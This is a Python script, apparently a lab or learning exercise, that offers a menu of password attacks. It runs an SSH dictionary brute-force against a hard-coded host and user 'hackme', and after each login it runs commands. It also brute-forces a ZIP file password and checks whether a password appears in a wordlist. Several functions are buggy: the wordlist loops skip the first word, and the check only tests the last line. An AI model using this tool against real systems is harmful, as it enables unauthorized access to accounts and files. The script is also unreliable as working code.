#! /usr/bin/env python3
from pexpect import pxssh
from zipfile import ZipFile
import time, getpass, logging

# Declare functions
def iterator ():
    filepath = input("Enter your dictionary filepath:\n")
    #filepath = '/home/osboxes/Desktop/rockyou2.txt' #test filepath
    
    file = open(filepath, encoding = "ISO-8859-1") # address encoding problem
    line = file.readline()
    while line:
        line = line.rstrip()
        word = line
        print(word)
        time.sleep(1)
        line = file.readline()
    file.close()

def check_password():
    passwd = input("What Password would you like to check?\n")
    filepath = input("Enter your dictionary filepath:\n")
    file = open(filepath, encoding = "ISO-8859-1") # address encoding problem
    line = file.readline()
    while line:
        line = line.rstrip()
        line = file.readline()
    
    if passwd in line:
        print(f"\n{passwd} was found in {filepath}.")
        file.close()
            
    else:
        print(f"\n{passwd} wasn't found in {filepath}.")
        file.close()
            
def brute_force():
    s = pxssh.pxssh()
    host = "192.168.4.100"
    username = "hackme"
    filepath = input("Enter your dictionary filepath:\n")
    file = open(filepath, encoding = "ISO-8859-1") # address encoding problem
    line = file.readline()

    while line:
        line = line.rstrip()
        line = file.readline()
        pwd = line.rstrip("\n")
    
    
        try:
            s.login(host, username, pwd)
            s.sendline('uptime')
            s.prompt()
            print(s.before)        # print everything before the prompt.
            s.sendline('ls -l')
            s.prompt()
            print(s.before)
            s.sendline('df')
            s.prompt()
            print(s.before)
            s.logout()
            s.close()
            s = pxssh.pxssh()
            


        except pxssh.ExceptionPxssh as e:
            print("pxssh failed on login.")
            print(e)    

def zip_unlock():
    zip_file = "protectme2.zip"

    filepath = input("Enter your dictionary filepath:\n")
    file = open(filepath, encoding = "ISO-8859-1") # address encoding problem
    line = file.readline()

    while line:
        line = line.rstrip()
        line = file.readline()
        password = line.rstrip("\n")
        with ZipFile(zip_file) as zf:
            zf.extractall(pwd=bytes(password,'utf-8'))

#
#
#

# Main

if __name__ == "__main__": # when my computer runs this file...do this stuff
    while True:
        mode = input("""
Brue Force Wordlist Attack Tool Menu
1 - Offensive, Dictionary Iterator
2 - Defensive, Password Recognized
3 - Offensive, Brute Force
4 - Offensive, Zip File Brute force
5 - Exit
    Please enter a number: 
""")
        if (mode == "1"):
            iterator()
        elif (mode == "2"):
            check_password()
        elif (mode == '3'):
            brute_force()
        elif (mode == '4'):
            zip_unlock()
        elif (mode == "5"):
            break
        else:
            print("Invalid selection...")